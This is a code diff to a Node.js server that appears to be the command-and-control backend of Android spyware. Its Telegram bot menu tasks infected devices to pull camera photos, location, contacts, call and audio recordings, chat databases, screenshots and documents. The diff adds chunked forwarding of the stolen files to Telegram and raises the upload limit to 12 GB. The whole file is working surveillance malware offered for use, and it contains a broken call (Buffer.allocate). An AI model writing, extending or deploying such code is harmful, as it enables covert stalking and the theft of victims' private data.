@@ -33,7 +33,7 @@ appBot.on('polling_error', (error) => {
 });
 
 app.use(express.text({ type: 'application/json', limit: '2048mb' }));
-app.use(express.raw({ type: 'application/octet-stream', limit: '5000mb' }));
+app.use(express.raw({ type: 'application/octet-stream', limit: '12000mb' }));
 
 async function sendTg(msg, options = {}) {
     try {
@@ -43,8 +43,41 @@ async function sendTg(msg, options = {}) {
     }
 }
 
+async function sendTgDocumentSmart(filePath, caption) {
+    const stats = fs.statSync(filePath);
+    const fileSizeMB = stats.size / (1024 * 1024);
+    const CHUNK_LIMIT = 45 * 1024 * 1024; // 45MB حد تيليجرام الآمن
+
+    if (stats.size <= CHUNK_LIMIT) {
+        try {
+            await appBot.sendDocument(chatId, filePath, { caption: `${caption}\n⚔️ [إشراف السلطان ناصر دين الله الكلعي]` });
+        } catch (e) {
+            await sendTg(`⚠️ فشل إرسال الملف مباشرة، تم حفظه محلياً في <code>uranium_storage/${path.basename(filePath)}</code> (${fileSizeMB.toFixed(2)} MB).`);
+        }
+    } else {
+        await sendTg(`📦 الملف <b>${path.basename(filePath)}</b> ضخم جداً (${fileSizeMB.toFixed(2)} MB). جاري تقسيمه وإرساله أجزاء بأمر السلطان...`);
+        const fd = fs.openSync(filePath, 'r');
+        const buffer = Buffer.allocate(CHUNK_LIMIT);
+        let partNum = 1;
+        let bytesRead;
+
+        while ((bytesRead = fs.readSync(fd, buffer, 0, CHUNK_LIMIT, null)) > 0) {
+            const partPath = `${filePath}.part${String(partNum).padStart(3, '0')}`;
+            fs.writeFileSync(partPath, buffer.slice(0, bytesRead));
+            try {
+                await appBot.sendDocument(chatId, partPath, { caption: `${caption} - الجزء (${partNum})\n⚔️ [السلطان ناصر دين الله الكلعي]` });
+            } catch (err) {
+                await sendTg(`⚠️ فشل إرسال الجزء ${partNum}`);
+            }
+            try { fs.unlinkSync(partPath); } catch (e) {}
+            partNum++;
+        }
+        fs.closeSync(fd);
+    }
+}
+
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️️] URANIUM CONTROLLING SERVER v7.7 ONLINE [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM CONTROLLING SERVER v7.7 ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
@@ -66,21 +99,13 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
         const stats = fs.statSync(controllerFilePath);
         const fileSizeMB = stats.size / (1024 * 1024);
 
-        console.log(`[+] SUCCESS: File securely saved on controlling device -> ${controllerFilePath} (${fileSizeMB.toFixed(2)} MB)`);
+        console.log(`[+] SUCCESS: File securely saved -> ${controllerFilePath} (${fileSizeMB.toFixed(2)} MB)`);
+        await sendTg(`☢️ <b>حصاد جديد تم حفظه في خزينتك المركزية:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
 
-        try {
-            if (fileSizeMB <= 45) {
-                await appBot.sendDocument(chatId, controllerFilePath, { 
-                    caption: `☢️ <b>حصاد ملكي جديد مخزن على جهازك المتحكم:</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
-                });
-            } else {
-                throw new Error('File too large for Telegram');
-            }
-        } catch (tgErr) {
-            await sendTg(`⚠️ <b>تم الحفظ في وحدة تخزين جهازك المتحكم بنجاح:</b>\n📂 المسار: <code>uranium_storage/${path.basename(controllerFilePath)}</code>\n📊 الحجم: <b>${fileSizeMB.toFixed(2)} MB</b>\n(الملف بحوزتك محلياً بالكامل في مجلد الخادم).`);
-        }
+        // إرسال ذكي لتيليجرام مع التقسيم التلقائي
+        await sendTgDocumentSmart(controllerFilePath, `☠️ أرشيف الحصاد: <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
 
-        res.status(200).json({ status: 'OK', message: 'SAVED_ON_CONTROLLER' });
+        res.status(200).json({ status: 'OK', message: 'SAVED_AND_FORWARDED' });
     } catch (e) {
         console.error('Upload Error:', e);
         res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
@@ -129,7 +154,7 @@ appBot.on('message', async (msg) => {
     if (text === '/start') {
         db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
             if (!rows || rows.length === 0) {
-                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً.</b>`);
+                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً.</b>\n(تنفيذ بأمر السلطان ناصر دين الله الكلعي)`);
                 return;
             }
 
@@ -138,7 +163,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم المطلقة v7.7:</b>\nاختر العقدة للسيطرة التامة:`, {
+            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - غرفة القيادة v7.7:</b>\nاختر العقدة للسيطرة التامة:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -154,8 +179,8 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '☢️ الحصاد الشامل الكاميرا DCIM', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
-                    { text: '📥 التخزين الضخم Download (10GB+)', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
+                    { text: '☢️️ حصاد الكاميرا الشامل (DCIM)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
+                    { text: '📥 التخزين الضخم Download (12GB+)', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
                 ],
                 [
                     { text: '📍 تحديد الموقع بدقة خارقة (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
@@ -167,24 +192,20 @@ appBot.on('callback_query', async (query) => {
                 ],
                 [
                     { text: '📇 دليل جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
-                    { text: '📸 أحدث صورة فورية (Stealth)', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
+                    { text: '🎤 سحب التسجيلات الصوتية', callback_data: `cmd_EXTRACT_AUDIO_${nodeId}` }
                 ],
                 [
-                    { text: '🎤 سحب التسجيلات الصوتية', callback_data: `cmd_EXTRACT_AUDIO_${nodeId}` },
-                    { text: '📂 سحب مستندات الذاكرة الداخلية', callback_data: `cmd_EXTRACT_DOCS_${nodeId}` }
+                    { text: '📂 مستندات الذاكرة الداخلية', callback_data: `cmd_EXTRACT_DOCS_${nodeId}` },
+                    { text: '📞 المكالمات المسجلة', callback_data: `cmd_EXTRACT_AUDIO_CALLS_${nodeId}` }
                 ],
                 [
-                    { text: '📞 سحب المكالمات المسجلة', callback_data: `cmd_EXTRACT_AUDIO_CALLS_${nodeId}` },
-                    { text: '💬 قواعد بيانات الدردشة', callback_data: `cmd_EXTRACT_CHAT_DBS_${nodeId}` }
-                ],
-                [
-                    { text: '🖼️ لقطات الشاشة الحية', callback_data: `cmd_EXTRACT_SCREENSHOT_ZIP_${nodeId}` },
-                    { text: '📋 سحب الحافظة (Clipboard)', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }
+                    { text: '💬 قواعد بيانات الدردشة', callback_data: `cmd_EXTRACT_CHAT_DBS_${nodeId}` },
+                    { text: '🖼️ لقطات الشاشة الحية', callback_data: `cmd_EXTRACT_SCREENSHOT_ZIP_${nodeId}` }
                 ],
                 [{ text: '🔙 القائمة الرئيسية', callback_data: 'back_home' }]
             ]
         };
-        await appBot.editMessageText(`🎯 <b>العقدة تحت السيطرة المطلقة:</b> <code>${nodeId}</code>`, {
+        await appBot.editMessageText(`🎯 <b>العقدة تحت السيطرة المطلقة للسلطان:</b> <code>${nodeId}</code>`, {
             chat_id: msg.chat.id,
             message_id: msg.message_id,
             parse_mode: 'HTML',
@@ -196,7 +217,7 @@ appBot.on('callback_query', async (query) => {
         const action = parts.slice(1).join('_');
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
-            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر [${action}] بنجاح!` });
+            await appBot.answerCallbackQuery(query.id, { text: `☢️️ تم إطلاق الأمر [${action}] بأمر السلطان!` });
             await sendTg(`⚡ <b>أمر سيطرة [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
@@ -206,4 +227,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Uranium Controlling Server Online on port ${PORT}`));
+app.listen(PORT, () => console.log(`[+] Uranium Controlling Server Online on port ${PORT} (ناصر دين الله الكلعي)`));
